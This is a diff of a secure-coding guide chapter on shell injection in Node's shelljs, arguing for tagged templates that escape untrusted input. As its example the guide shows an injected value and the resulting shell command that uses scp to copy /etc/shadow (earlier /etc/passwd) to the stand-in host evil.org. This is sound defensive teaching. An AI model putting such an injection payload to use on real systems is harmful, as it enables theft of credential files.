@@ -2,10 +2,10 @@
 
 Threats: [SHP][]
 
-The [`shelljs`][] module allows access to the system shell.  We focus
-on `shelljs`, but similar arguments apply to builtins like
-[`child_process.spawn(cmd, { shell: ... })`][cp.spawn] and similar
-modules.
+The `shelljs` module ([npm][shelljs]) allows access to the system
+shell.  We focus on `shelljs`, but similar arguments apply to builtins
+like `child_process.spawn(cmd, { shell: ... })` ([docs][cp.spawn]) and
+similar modules.
 
 `shelljs` has some nice programmatic APIs for common shell commands
 that escape arguments.
@@ -18,45 +18,65 @@ injection since shell scripts tend to call other shell scripts, so
 properly escaping arguments to one script doesn't help if the script
 sloppily composes a sub-shell.  The problem of tools that trust their
 inputs is not limited to shell scripts: see discussion of image decoders
-in [BOF][].  The [shell grammar][] has more layers of interpretation than
-the SQL grammar.
+in [BOF][].
 
-We can do much better though.
+The shell grammar ([docs][shell grammar]) has more layers of
+interpretation so is arguably more complex than any one SQL grammar.
+
+We can do much better than string concatenation though.  The code
+below is vulnerable.
 
 ```js
 shelljs.exec("executable '" + x + "'")
 ```
 
-is much more problematic than either of
+If an attacker causes
+
+```js
+x = " '; scp /etc/shadow evil@evil.org/; echo ' ";
+```
+
+then what gets passed to the shell is
+
+```js
+executable ' '; scp /etc/shadow evil@evil.org/; echo ' '
+```
+
+Instead, consider:
 
 ```js
 shelljs.exec`executable ${x}`
 
-shelljs.exec`executable "${x}"`
+shelljs.exec`executable '${x}'`
 ```
 
-The latter two know which strings come from the developer:
-`["executable "]`, and which are inline expressions: `x`.
-By properly escaping `x` we prevent a single
-point of failure where an attacker who can cause
+This use of tagged templates is roughly equivalent to
 
 ```js
-x = " '; scp /etc/passwd evil@evil.org/; echo ' ";
+shelljs.exec(["executable ", ""], x)
+
+shelljs.exec(["executable \'", "\'"], x)
 ```
 
-causes execution of the following script
+This way, when control reaches `shelljs`, it knows which strings came
+from the developer: `["executable ", ""]`, and which are inline
+expressions: `x`.  If `shelljs` properly escapes the latter, it
+prevents the breach above.
 
-```js
-executable ' '; scp /etc/passwd evil@evil.org/; echo ' '
-```
+The accompanying example ([code][sh-code]) includes a tag
+implementation for `sh` and `bash` that recognizes complex nesting
+semantics.
 
-The [accompanying example code][sh-code] includes a tag
-implementation for `sh` and `bash` that recognizes nesting
-contexts including double and single quoted strings, *heredoc*
-streams, and sub-shells like `$(...)` and <code>&#96;...&#96;</code>.
+We can't, working within the confines of Node, prevent poorly written
+command line tools from breaking when exposed to untrusted inputs, but
+we can make sure that we preserve the developer's intent when they
+write code that invokes command line tools.  For projects that have
+legitimate reasons for invoking sub-shells, consistently using
+template tags like this solves some problems and makes it more likely
+that effort spent hardening command line tools will yield fruit.
 
 [shell grammar]: http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_10
-[`shelljs`]: https://www.npmjs.com/package/shelljs
+[shelljs]: https://www.npmjs.com/package/shelljs
 [cp.spawn]: https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options
 [SHP]: ../chapter-1/threat-SHP.md
 [BOF]: ../chapter-1/threat-BOF.md
